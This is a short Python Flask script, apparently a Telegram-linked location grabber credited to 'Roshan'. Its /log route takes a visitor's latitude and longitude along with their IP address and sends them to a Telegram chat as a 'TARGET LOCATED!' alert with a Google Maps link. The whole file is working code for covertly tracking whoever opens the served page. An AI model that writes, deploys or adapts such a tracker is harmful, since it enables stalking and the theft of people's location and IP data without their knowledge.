from flask import Flask, render_template, request
import telebot
import os

app = Flask(__name__)
bot = telebot.TeleBot(os.getenv("BOT_TOKEN"))

@app.route('/')
def home():
    return render_template('index.html', user_id=request.args.get('id'))

@app.route('/log')
def log():
    lat, lon, uid = request.args.get('lat'), request.args.get('lon'), request.args.get('id')
    if lat and lon:
        maps = f"https://www.google.com/maps?q={lat},{lon}"
        msg = f"🚨 **TARGET LOCATED!**\n\n📍 Maps: [View]({maps})\n🌐 IP: `{request.remote_addr}`\n\n✨ **Created by Roshan** ✨"
        bot.send_message(uid, msg, parse_mode="Markdown")
    return "OK"

if __name__ == "__main__":
    app.run()
  
